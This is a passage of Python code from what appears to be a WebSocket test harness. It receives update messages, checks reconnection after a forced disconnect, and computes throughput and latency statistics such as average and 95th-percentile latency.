                        response = await asyncio.wait_for(ws.recv(), timeout=2)
                        data = json.loads(response)
                        
                        if data.get('type') == 'update':
                            updates_received += 1
                            results['messages_received'] += 1
                            results['message_types']['update'] += 1
                            messages.append(data)
                        elif data.get('type') == 'subscription_confirmed':
                            results['message_types']['subscription'] += 1
                            
                    except asyncio.TimeoutError:
                        # No more messages
                        break
                    except Exception as e:
                        results['errors'].append(str(e))
                
                # Test reconnection
                if duration > 10:
                    logger.debug("Testing reconnection...")
                    reconnect_start = time.time()
                    
                    # Force disconnect
                    await ws.close()
                    
                    # Reconnect
                    try:
                        async with websockets.connect(url, timeout=10) as ws2:
                            results['reconnection_time'] = (time.time() - reconnect_start) * 1000
                            
                            # Send test message
                            await ws2.send(json.dumps({'type': 'ping'}))
                            response = await asyncio.wait_for(ws2.recv(), timeout=5)
                            results['messages_received'] += 1
                    except Exception as e:
                        results['errors'].append(f"Reconnection failed: {e}")
                
                # Calculate throughput
                results['throughput'] = results['messages_received'] / max(1, time.time() - start_time)
                
        except websockets.exceptions.WebSocketException as e:
            results['errors'].append(f"WebSocket error: {e}")
        except Exception as e:
            results['errors'].append(str(e))
        
        # Calculate statistics
        if results['latency_ms']:
            results['avg_latency_ms'] = sum(results['latency_ms']) / len(results['latency_ms'])
            results['min_latency_ms'] = min(results['latency_ms'])
            results['max_latency_ms'] = max(results['latency_ms'])
            results['p95_latency_ms'] = np.percentile(results['latency_ms'], 95) if NUMPY_AVAILABLE else 0
        
        results['total_messages'] = len(messages)
        results['duration'] = time.time() - start_time
        
        return results
    
    async
